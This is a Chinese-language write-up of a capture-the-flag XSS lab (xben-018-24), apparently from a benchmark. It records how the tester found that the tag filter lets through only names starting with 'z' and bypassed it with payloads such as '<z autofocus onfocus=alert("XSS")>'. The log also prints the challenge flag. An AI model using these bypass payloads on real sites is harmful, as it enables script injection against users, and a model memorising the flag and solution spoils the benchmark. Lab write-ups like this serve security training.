# xben-018-24 · 探索记录

对应题解：[`xben-018-24.md`](./xben-018-24.md)

## 目标与起点

容器 `10.0.173.136:5000`，`Werkzeug/1.0.1 Python/2.7.18`。

`GET /` → `Dalgona Challenges`，入口 `Page`。
`GET /page` 标题 `Dalgona - Umbrella`，样式表 `static/css/xss/xss31.css`。

反射在文本节点，只有一个反射点：

```html
<input type=text name=name placeholder="Enter your name..."> MARK>
```

额外确认过：`POST /page` 不反射；`?x=`、`?q=`、`?msg=` 等参数都不反射；
`/xss31`、`/solution`、`/check`、`/flag` 等路由全部 404。所以入口唯一。

## 第一阶段：最大的一个误判

先按同族经验试常见载荷，反射行都是空的：

| payload | 反射 |
| --- | --- |
| `<svg/onload=alert("XSS")` | （空） |
| `<input autofocus onfocus=alert("XSS")>` | （空） |

我当时判断"输入被整段丢弃"（像 013/016 那样），于是去猜触发词。
**实际上页面里有提示**，只是我的 grep 只匹配 `Oops!`/`Congratulations`，漏掉了它：

```html
<div class='solution-text'>Sorry, you can't use that tag </div>
```

这个提示的排版（`class='solution-text'` 用单引号）与正常的
`class="solution-text"` 不同，所以肉眼扫也没注意到。

**教训**：反射为空时，应该完整看一遍响应，而不是只 grep "熟悉的文案"。

## 第二阶段：逐字母枚举

既然提示是"can't use that tag"，说明拦的是**标签**。对 26 个字母各测 `<X`：

```text
kept   : zZ
dropped: abcdefghijklmnopqrstuvwxyABCDEFGHIJKLMNOPQRSTUVWXY
```

**只有 `z`/`Z` 能作为标签名首字母。** 这不是黑名单列表，而是字符类范围写成了 `a-y`。

补充边界：

| 输入 | 结果 |
| --- | --- |
| `</div>` / `</z>` | 拒绝 |
| `<!--` / `<!DOCTYPE html>` | 通过 |
| `<` / `<<` / `<1` / `< z` | 通过 |
| `<zz>` / `<z a=1>` | 通过 |

## 第三阶段：用 `z` 开头的自定义元素触发事件

未知元素不是标准 HTML 标签，但**属性和焦点事件仍然有效**：

| payload | 结果 |
| --- | --- |
| `<z autofocus onfocus=alert("XSS")>` | **Congratulations** |
| `<z onfocus=alert("XSS")>` | **Congratulations** |
| `<zz autofocus onfocus=alert("XSS")>` | **Congratulations** |
| `<z tabindex=0 autofocus onfocus=alert("XSS")>` | **Congratulations** |
| `<z contenteditable autofocus onfocus=alert("XSS")>` | **Congratulations** |
| `<z/autofocus/onfocus=alert("XSS")>` | **Congratulations** |
| `<z>` | 失败（只创建元素，无事件） |

## 第四阶段：拿 flag

```bash
curl --get --data-urlencode 'name=<z autofocus onfocus=alert("XSS")>' http://$T/page
```

```html
Congratulations!<p> Here is the flag: flag{5fa1aa53-1445-4ae6-836f-c20854db80ca}
```

提交：`correct: true, awarded: 500`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `<svg/onload=…` / `<input autofocus …>` | 拒绝 | 提示 `Sorry, you can't use that tag`（我最初误判为"静默丢弃"） |
| 猜"触发词黑名单"（像 013 的 alert/confirm） | 方向错 | 提示明确说的是 tag，不是 keyword |
| 百分号编码绕过（`?name=%3Csvg…` 不做二次编码） | 拒绝 | 过滤作用在 URL 解码后的值上 |
| `</z>` / `</div>` | 拒绝 | `</` 单独被拦，与首字母无关 |
| `<z>`（只有标签） | 失败 | 需要事件属性 |
| 假设"必须用真实标签" | 局限 | 自定义元素同样能挂 `onfocus` |

## 这次真正的收获

1. **反射为空时必须读完整个响应。** 这关有明确提示
   `Sorry, you can't use that tag`，我因为只 grep 熟悉文案而漏看，
   误判成"静默丢弃"，直接导致后续方向（猜触发词）全错。
2. **"几乎所有字母都被拒"是强信号。** 真实黑名单不会拦 `<f`、`<q`、`<y`
   这些不存在的标签；出现这种情况只可能是**字符类范围写错**。
   逐个字母枚举 26 次就能定位到"只有 z 活着"，比猜快且确定。
3. **自定义元素可以承载事件处理器。** 只要浏览器肯创建元素，
   `autofocus`/`tabindex` + `onfocus` 就能在没有标准标签语义的情况下触发 JS。
   这为"标签名被大面积封锁"的场景提供了一个通用出口。
4. **过滤实现有两种典型 bug 值得优先怀疑：字符类差一、正则漏写锚点。**
   本题是前者（`[a-y]`）；遇到"某个字母/符号刚好能过"的现象时，
   先怀疑范围写错，而不是去构造更复杂的绕过。
5. **`</` 与 `<!--` 的差异说明过滤是分情况写的。** 这类"分情况"的实现往往
   在边界上留缝（本题的缝就是 `z`），枚举边界永远比猜实现划算。
